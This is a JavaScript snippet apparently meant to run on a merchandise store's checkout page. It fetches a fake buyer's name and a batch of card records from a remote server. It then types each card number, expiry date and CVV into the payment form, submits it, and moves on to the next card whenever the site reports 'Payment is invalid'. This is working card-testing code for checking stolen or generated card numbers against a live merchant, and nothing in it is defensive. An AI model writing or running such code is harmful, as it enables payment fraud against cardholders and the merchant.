var postUrl = "https://" + baseUrl + "/post";
var fakeUrl = "https://" + baseUrl + "/fake?city=Miami";
var interval = null;
var iteration = null;
var options = {
     url:fakeUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
  var i = 0;
  var percentage = 30;
  var len = Math.ceil(arr.length * (percentage / 100));

  var iteration = function() {
    if( i < len ) {
      var json = arr[i++];
      sessionStorage.card = JSON.stringify( json );
      
      jQuery("#wmg_cidersauce_sop_card_type").val(json.card[0] == "4" ? "VI" : "MC");
      jQuery("#wmg_cidersauce_sop_card_number").val(json.card);
      jQuery("#wmg_cidersauce_sop_expiration").val(Number(json.mon));
      jQuery("#wmg_cidersauce_sop_expiration_yr").val("20" + json.year);
      jQuery("#wmg_cidersauce_sop_card_cvn").val(json.cvv);
      jQuery(".button.action.large.arrowed").click();

      interval = setInterval(function() {
        console.log("Procesando");
        if(jQuery(".toast-item.toast-type-error>p").text().indexOf("Payment is invalid") >= 0) {
          console.log("Probemos otra");
          clearInterval(interval);
          jQuery(".toast-item-close").click()
          setTimeout(iteration, 5000);
        }
      }, 3000)
    }
    else {
      jQuery.ajax(options)
      .success(cards);
    }
  }

  iteration();
};
var fake = function( person ) {
  console.log( person.fullname );

  jQuery("#wmg_cybersource_cc_owner").val( person.firstname + " " + person.lastname );

  options.url = postUrl;
  jQuery.ajax(options)
  .success(cards);;
}
// store.WizKhalifa
jQuery.ajax(options)
.success(fake);